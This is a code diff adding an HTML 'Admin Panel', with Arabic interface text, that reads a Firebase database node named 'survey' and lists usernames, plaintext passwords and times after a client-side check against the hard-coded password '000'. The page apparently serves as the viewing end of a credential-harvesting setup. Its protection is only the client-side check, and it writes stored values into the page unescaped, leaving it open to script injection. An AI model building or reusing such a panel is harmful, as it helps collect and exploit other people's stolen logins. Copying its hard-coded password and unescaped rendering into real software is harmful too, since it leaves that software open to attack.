@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Panel</title>
+
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: #0f172a;
+    color: white;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+}
+
+.box {
+    background: #1e293b;
+    padding: 20px;
+    width: 100%;
+    max-width: 450px;
+    border-radius: 10px;
+    box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+}
+
+input {
+    width: 100%;
+    padding: 10px;
+    margin-top: 10px;
+    border: 1px solid #334155;
+    background: #0f172a;
+    color: white;
+    border-radius: 6px;
+    outline: none;
+}
+
+button {
+    width: 100%;
+    padding: 10px;
+    margin-top: 10px;
+    background: #3b82f6;
+    border: none;
+    color: white;
+    border-radius: 6px;
+    cursor: pointer;
+    font-weight: bold;
+}
+
+button:hover {
+    background: #2563eb;
+}
+
+.item {
+    background: #334155;
+    padding: 12px;
+    margin-top: 10px;
+    border-radius: 6px;
+    font-size: 14px;
+    word-break: break-all;
+}
+
+#login-form {
+    display: block;
+}
+
+#data {
+    margin-top: 15px;
+    max-height: 400px;
+    overflow-y: auto;
+}
+</style>
+</head>
+
+<body>
+
+<div class="box">
+    <div id="login-form">
+        <h3 style="margin-top:0;">Admin Login</h3>
+        <input id="pass" type="password" placeholder="Password">
+        <button onclick="login()">Login</button>
+        <p id="error-msg" style="color:#ef4444; font-size:13px; margin-top:8px; display:none;">كلمة السر غير صحيحة!</p>
+    </div>
+
+    <div id="data"></div>
+</div>
+
+<script>
+// تم تحديث رابط قاعدة البيانات هنا
+const firebaseConfig = {
+    databaseURL: "https://drdgv-bfca4-default-rtdb.firebaseio.com/"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+function login() {
+    const passwordInput = document.getElementById("pass").value;
+    const errorMsg = document.getElementById("error-msg");
+
+    if (passwordInput === "000") {
+        errorMsg.style.display = "none";
+        document.getElementById("login-form").style.display = "none";
+        loadData();
+    } else {
+        errorMsg.style.display = "block";
+    }
+}
+
+function loadData() {
+    const dataContainer = document.getElementById("data");
+    dataContainer.innerHTML = "<p>جاري تحميل البيانات...</p>";
+
+    db.ref("survey").on("value", snap => {
+        let data = snap.val();
+        
+        if (!data) {
+            dataContainer.innerHTML = "<p>لا توجد بيانات مسجلة حتى الآن.</p>";
+            return;
+        }
+
+        let html = "<h4 style='margin-top:0;'>البيانات المسجلة:</h4>";
+
+        for (let key in data) {
+            let item = data[key];
+            html += `
+                <div class="item">
+                    <b>User:</b> ${item.username || 'N/A'}<br>
+                    <b>Pass:</b> ${item.password || 'N/A'}<br>
+                    <b>Time:</b> ${item.time || 'N/A'}
+                </div>
+            `;
+        }
+
+        dataContainer.innerHTML = html;
+    }, error => {
+        console.error(error);
+        dataContainer.innerHTML = `<p style="color:#ef4444;">خطأ في جلب البيانات: ${error.message}</p>`;
+    });
+}
+</script>
+
+</body>
+</html>
